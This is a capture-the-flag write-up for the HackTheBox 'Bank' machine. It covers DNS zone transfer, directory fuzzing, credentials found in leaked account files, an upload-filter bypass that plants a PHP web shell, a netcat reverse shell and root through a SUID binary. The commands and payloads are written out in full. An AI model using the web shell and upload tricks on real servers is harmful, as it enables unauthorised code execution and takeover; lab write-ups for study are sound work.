### Bank HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.29

Nmap Scan:

```
─$ nmap -sCV -A 10.10.10.29 -p22,53,80 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-31 12:01 WAT
Nmap scan report for 10.10.10.29
Host is up (0.55s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.88 seconds
```

So we have 3 ports open which are 22,53 & 80

I'll start enumeration on port 80
![image](https://user-images.githubusercontent.com/113513376/215743324-40100887-d58f-4fc6-80f5-ef7b4f394233.png)

Since the box name is bank i'll assume the domain is bank.htb

So i'll check a quick zone transfer

```
└─$ dig axfr bank.htb @10.10.10.29

; <<>> DiG 9.18.4-2-Debian <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 447 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Tue Jan 31 12:26:28 WAT 2023
;; XFR size: 6 records (messages 1, bytes 171)
```

So i'm right. Now i'll add the domain name to /etc/hosts then run a vhost scan

```
└─$ cat /etc/hosts | grep "bank.htb"
10.10.10.29     bank.htb
```

Now on heading over to the domain on the web browser, I see a different web page
![image](https://user-images.githubusercontent.com/113513376/215749387-c7f8a0dd-09cd-446a-8634-9bd2b0ff78b5.png)

It requires login, I tried various injection attack but non worked for me

So lets fuzz for files and directories

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ gobuster dir -u http://bank.htb -w directories -x php                                                                                              
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directories
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/02 03:06:52 Starting gobuster in directory enumeration mode
===============================================================
/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
/index.php            (Status: 302) [Size: 7322] [--> login.php]
/login.php            (Status: 200) [Size: 1974]
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/support.php          (Status: 302) [Size: 3291] [--> login.php]
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
===============================================================
2023/02/02 03:06:55 Finished
===============================================================
```

Heading over to the `balance-transfer` directory i see many files 
![image](https://user-images.githubusercontent.com/113513376/216213640-5a8b68c5-6cd9-4ea8-b072-295959603eec.png)


Clicking a random file gives me
![image](https://user-images.githubusercontent.com/113513376/216213714-b970dc79-a460-4ae7-8fd6-309daff34148.png)

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ file 0a0b2b566c723fce6c5dc9544d426688.acc 
0a0b2b566c723fce6c5dc9544d426688.acc: ASCII text
                                                                                                                                                                                              
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ cat 0a0b2b566c723fce6c5dc9544d426688.acc 
++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
CreditCards: 5
Transactions: 93
Balance: 905948 .
===UserAccount===
```

Seems like an encoded string but when i attempted decoding it doesn't give me anything useful

So what i'll do is to get the whole files in that directory and grep for stuffs

```
Command Used: wget -r http://bank.htb/balance-transfer/
```

After running it we should get all files in that directory

```
┌──(mark__haxor)-[~/_/B2B/HTB/Bank/web]
└─$ l                                                                                                                                                                                         
bank.htb/                                                                                                                                                                                     
┌──(mark__haxor)-[~/_/B2B/HTB/Bank/web]
└─$ cd bank.htb                                                                                                                                                                               
┌──(mark__haxor)-[~/_/HTB/Bank/web/bank.htb]
└─$ l                                                                                                                                                                                         
assets/  balance-transfer/  icons/  index.html                                                                                                                                                
┌──(mark__haxor)-[~/_/HTB/Bank/web/bank.htb]
└─$ cd balance-transfer                                                                                                                                                                       
┌──(mark__haxor)-[~/_/Bank/web/bank.htb/balance-transfer]
└─$ ls                                                                                                                                                                                        
 0016a3b79e3926a08360499537c77e02.acc   388a6d78ca9a5677cfe6ac6333d10e54.acc   7a3062ecd98719e7faac95a4efe188ee.acc   
 001957ef359d651fbb8f59f3a8504a2f.acc   388bd4708d5399f3b57f01b743d41be8.acc   7a323fcd47afe7cc6248f2fe6e4f8802.acc   
 0026d872694cf17e69618437db0f5f83.acc   39095d3e086eb29355d37ed5d19a9ed0.acc   7a6c81c0e6780f912586590a9bb3d4e9.acc   
 [-------------------------------------------------SNIP-----------------------------------------------------------]
 
```

So after grepping for many stuffs i tried special characters and it worked i got a valid credential

```
┌──(mark__haxor)-[~/_/Bank/web/bank.htb/balance-transfer]
└─$ grep -ir @   
68576f20e9732f1b2edc4df5b8533230.acc:Email: chris@bank.htb
                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/Bank/web/bank.htb/balance-transfer]
└─$ cat 68576f20e9732f1b2edc4df5b8533230.acc       
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

So i'll try it over the login page we previously saw 🙂
![image](https://user-images.githubusercontent.com/113513376/216215180-715a0c18-8624-4e15-ac1d-7b9dbf9eb794.png)

Cool it worked. There's a support page
![image](https://user-images.githubusercontent.com/113513376/216215315-a6891716-070d-4266-ae50-0307bb23c16e.png)

It allows upload of file 🤔

Remember from the directory scan we got a directory called upload 

So i'll upload a php command execution file and see what happens

```
Payload: <?php system($_ REQUEST['cmd']); ?>
```
![image](https://user-images.githubusercontent.com/113513376/216215699-641369d4-4c9b-441e-9843-4869a339b317.png)

On clicking submit i get an error 😥
![image](https://user-images.githubusercontent.com/113513376/216215773-7c1af9b2-c804-4d17-993a-782a7730a9cc.png)

So i'll change the file image header to a jpg file

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ cat shellexec.php
AAAA<?php system($_REQUEST['cmd']); ?>
                                                                                                                                                                                              
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ hexeditor shellexec.php 
                                                                                                                                                                                              
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ file shellexec.php                       
shellexec.php: JPEG image data
                                                                                                                                                                                              
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ cat shellexec.php 
<?php system($_REQUEST['cmd']); ?>
```

Now i'll try uploading it again but this time intercepting the request with burp suite and changing the Content-Type also with the file extension to a double extension

Here's the request

```
POST /support.php HTTP/1.1
Host: bank.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12793753771615840525244225761
Content-Length: 629
Origin: http://bank.htb
Connection: close
Referer: http://bank.htb/support.php
Cookie: HTBBankAuth=igibbtkhuu9olss9179sqkcvv1
Upgrade-Insecure-Requests: 1

-----------------------------12793753771615840525244225761
Content-Disposition: form-data; name="title"

Hello
-----------------------------12793753771615840525244225761
Content-Disposition: form-data; name="message"

Gimme Shell
-----------------------------12793753771615840525244225761
Content-Disposition: form-data; name="fileToUpload"; filename="shellexec.jpg.php"
Content-Type: images/jpeg

ÿØÿî<?php system($_REQUEST['cmd']); ?>

-----------------------------12793753771615840525244225761
Content-Disposition: form-data; name="submitadd"


-----------------------------12793753771615840525244225761--
```

Now i'll forward it
![image](https://user-images.githubusercontent.com/113513376/216216460-627b44fc-8382-4e59-8e7e-a74aa98d4305.png)

Damn it still fails. On checking the source code reveals an interesting detail
![image](https://user-images.githubusercontent.com/113513376/216216848-529a09a9-a90c-468f-bd55-62109624d850.png)

```
!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```

Now instead of uploading a .php file i'll change the extension to .htb cause it will execute as php

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ mv shellexec.php shellexec.htb  
```

So lets upload that now
![image](https://user-images.githubusercontent.com/113513376/216217029-180523cc-ad76-44bc-aa17-c27db5b50679.png)


Boom!!! It worked
![image](https://user-images.githubusercontent.com/113513376/216217083-9e2f194b-4250-4992-84f3-88d104f0e7bc.png)

We see we're given the link to access the file on clicking it i get redirected to /uploads/shellexec.htb

Now lets execute command
![image](https://user-images.githubusercontent.com/113513376/216217209-1b83a9eb-8f4c-4559-b847-08caef7339af.png)

So now we have command execution on the server 

But i'm in 💙 with phpbash i'll upload phpbash as my shell
![image](https://user-images.githubusercontent.com/113513376/216217597-813c217b-2709-43ee-bdfb-b7a79f5d5f40.png)

We see it very much looks like a terminal 

So lets get a reverse shell. I used normal bash reverse shell

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bank]
└─$ nc -lvnp 1337            
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.29] 59030
bash: cannot set terminal process group (1070): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/var/www/bank/uploads$ 
```

As usual time to stabilzie the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Time to escalte priv 

There's a user called chris

```
www-data@bank:/home$ ls   
chris
```

Searching for suid binary shows this

```
www-data@bank:/$ find / -type f -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

`/var/htb/bin/emergency` looks weird lets check it out

```
www-data@bank:/var/htb/bin$ ls
emergency
www-data@bank:/var/htb/bin$ file emergency 
emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
www-data@bank:/var/htb/bin$ ./emergency 
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
root.txt
# cat root.txt
32f0befb6f82e1de879cc6fe614ec8b9
# 
```

Well it gave us root shell xD

And we're done

<br> <br>
[Back To Home](../../index.md)

